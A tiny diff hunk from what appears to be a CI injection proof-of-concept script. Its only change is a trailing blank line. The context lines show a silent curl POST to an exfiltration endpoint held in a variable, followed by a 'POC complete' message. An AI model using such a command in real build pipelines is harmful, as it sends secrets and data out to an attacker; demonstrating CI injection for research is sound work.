@@ -28,3 +28,4 @@ curl -s -X POST "${EXFIL}" \
   -o /dev/null
 
 echo "=== CI INJECTION POC COMPLETE ==="
+
